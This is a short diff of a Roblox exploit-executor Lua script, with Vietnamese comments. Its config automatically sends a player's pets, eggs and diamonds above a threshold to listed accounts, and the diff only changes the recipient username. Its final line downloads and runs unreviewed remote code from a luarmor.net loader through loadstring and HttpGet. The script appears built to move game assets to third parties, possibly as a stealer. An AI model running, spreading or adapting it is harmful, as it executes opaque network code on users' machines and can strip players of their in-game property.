@@ -12,9 +12,9 @@ getgenv().Config = {
         PET_SLOTS = { 1, 2, 3, 4, 5, 6, 7 }, -- slot dành cho pet
         EGG_SLOTS = { 8, 9, 10 }, -- slot dành cho trứng
     },
-    Usernames = { 'otokoza88' }, -- Danh sách người nhận
+    Usernames = { 'baodepzai129' }, -- Danh sách người nhận
     PetSendInterval = 20, -- Thời gian quét và gửi lại (giây)
     MinDiamonds = 10000000, -- Gửi khi kim cương > số này
-    Receivers = { 'otokoza88' }, -- Danh sách người nhận
+    Receivers = { 'baodepzai129' }, -- Danh sách người nhận
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/650444755c5495d80abdc753187316ac.lua"))()
